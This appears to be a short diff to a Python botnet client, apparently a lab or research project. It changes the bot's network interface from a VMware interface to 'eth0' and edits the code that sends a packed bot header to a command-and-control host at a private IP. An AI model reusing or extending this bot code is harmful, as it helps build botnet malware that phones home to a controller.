@@ -33,7 +33,7 @@ from subprocess import call
 DBG = False
 
 # Bot network interface
-IFACE = "vmnet8"
+IFACE = "eth0"
 
 # C&C connection IP and Port number
 HOST = "10.0.0.128"
@@ -126,7 +126,7 @@ def main():
             # Initialize socket
             s = init_socket(iface)
 
-            # Send data (BOT_RHEADER packed binary) TODO: bot_info
+            # Send data (BOT_RHEADER packed binary)
             data = buffer(bot_rheader)[:] * 2
             s.sendall(data)
 
